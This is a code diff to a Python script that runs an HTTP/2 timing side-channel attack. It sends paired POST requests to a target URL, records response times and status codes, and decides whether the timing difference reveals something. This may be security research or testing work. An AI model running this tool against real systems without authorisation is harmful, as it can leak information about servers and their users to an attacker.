@@ -7,13 +7,15 @@ import sys
 import requests
 import time
 
-def measure_response_time(url, data=None, cert_path='/etc/ca-certificates/trust-source/anchors/myCA.crt'):
+def measure_response_time(url, data=None, headers=None, cert_path='/etc/ca-certificates/trust-source/anchors/myCA.crt'):
     start_time = time.time_ns()  # Start time in nanoseconds
     response = requests.post(
         url, 
         data=data,
-        verify=cert_path
+        headers=headers,
+        verify=cert_path,        
     )
+    # print(response.text)
     end_time = time.time_ns()    # End time in nanoseconds
     elapsed_time_ns = end_time - start_time
     # elapsed_time = elapsed_time_ns / 1_000_000_000  # Convert to seconds
@@ -63,21 +65,26 @@ async def attack():
     
     safety_margin = num_request_pairs / 5
     
-    output = ''
-
     if (sys.argv[6] == "sequential"):
+        results = []
         for i in range(num_request_pairs):
-            timings = measure_response_time(target_url, data=post_data)
-            timings2 = measure_response_time(target_url, data=post_data2)
-            output = output + str(timings[0] - timings2[0]) + ',' + str(timings[1]) + ',' + str(timings2[1]) + '\n'
+            timings = measure_response_time(target_url, data=post_data, headers=headers)
+            timings2 = measure_response_time(target_url, data=post_data2, headers=headers2)
+            results.append(
+                (
+                    str(timings2[0] - timings[0]), # The time diff
+                    str(timings[1]), # one http code
+                    str(timings2[1]) # another http code
+                )
+            )
         
     else:
         async with H2Time(r1, r2, num_request_pairs=num_request_pairs, num_padding_params=40, sequential=True, inter_request_time_ms=10, timeout=50) as h2t:            
-            results = await h2t.run_attack()             
-            output = '\n'.join(map(lambda x: ','.join(map(str, x)), results))
-    
-    num = output.count('-')
+            results = await h2t.run_attack()                  
+    # print(results)
+    output = '\n'.join(map(lambda x: ','.join(map(str, x)), results))
 
+    num = output.count('-')
     print(output)
     # print((num / num_request_pairs) * 100)
     if ((num - (num_request_pairs/2)) > safety_margin):
